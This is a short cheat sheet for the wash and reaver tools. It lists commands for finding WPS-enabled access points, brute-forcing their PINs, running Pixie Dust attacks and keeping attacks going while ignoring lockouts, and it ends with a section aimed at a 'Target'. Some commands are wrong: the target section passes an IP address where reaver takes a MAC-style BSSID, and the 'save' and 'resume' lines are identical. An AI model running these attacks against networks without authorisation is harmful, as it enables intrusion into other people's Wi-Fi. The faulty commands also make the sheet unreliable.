# reaver CHEATSHEET

## Quick Reference

### WPS Scan
```bash
wash -i wlan0mon                    # Scan for WPS
wash -i wlan0mon -c 6               # Specific channel
wash -i wlan0mon -a                 # Show all APs
wash -i wlan0mon -j                 # JSON output
```

### PIN Attack
```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF              # Basic attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv         # Verbose
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6         # Specify channel
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s session   # Save session
```

### Pixie Dust Attack
```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K           # Pixie Dust
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -S        # Small DH keys
```

### Advanced Options
```bash
-d 5                # PIN delay (seconds)
-l 60               # Lock delay (seconds)
-g 100              # Max attempts
-r 10:5             # Recurring delay
-L                  # Ignore locks
-w                  # Windows 7 mode
-f                  # Fixed channel
```

### Session Management
```bash
reaver -i wlan0mon -b BSSID -s session_file  # Save
reaver -i wlan0mon -b BSSID -s session_file  # Resume
```

---

## Target: 192.168.1.x

```bash
# Quick WPS test
wash -i wlan0mon
reaver -i wlan0mon -b 192.168.1.1 -vvv

# Pixie Dust
reaver -i wlan0mon -b 192.168.1.1 -K -vvv

# Persistent attack
reaver -i wlan0mon -b 192.168.1.1 -s session -L -l 120
```
